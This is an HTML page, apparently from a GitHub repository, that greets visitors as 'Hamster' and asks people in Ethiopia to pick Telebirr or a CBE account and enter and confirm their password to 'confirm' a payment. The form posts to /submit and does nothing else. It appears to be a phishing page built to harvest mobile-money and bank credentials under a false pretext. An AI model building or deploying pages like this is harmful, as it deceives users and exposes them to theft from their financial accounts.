<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Confirmation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
        }
        .options {
            margin-bottom: 20px;
        }
        .options label {
            display: block;
            margin: 10px 0;
        }
        .options input[type="radio"] {
            margin-right: 10px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .submit-btn {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hey, I am Hamster</h1>
        <p>Do you live in Ethiopia? Please choose your payment method and confirm by adding your password.</p>
        
        <form action="/submit" method="post">
            <div class="options">
                <label>
                    <input type="radio" name="payment" value="telebirr" required>
                    Telebirr
                </label>
                <label>
                    <input type="radio" name="payment" value="cbe" required>
                    CBE Account
                </label>
            </div>

            <div class="form-group">
                <label for="password">Enter your password:</label>
                <input type="password" id="password" name="password" required>
            </div>

            <div class="form-group">
                <label for="confirm_password">Confirm your password:</label>
                <input type="password" id="confirm_password" name="confirm_password" required>
            </div>

            <button type="submit" class="submit-btn">Confirm</button>
        </form>
    </div>
</body>
</html>![2863e54caef7ff45eb1d5bf03d9f7b6a](https://github.com/user-attachments/assets/da9be466-d520-45fd-ae78-2702b5f067ba)
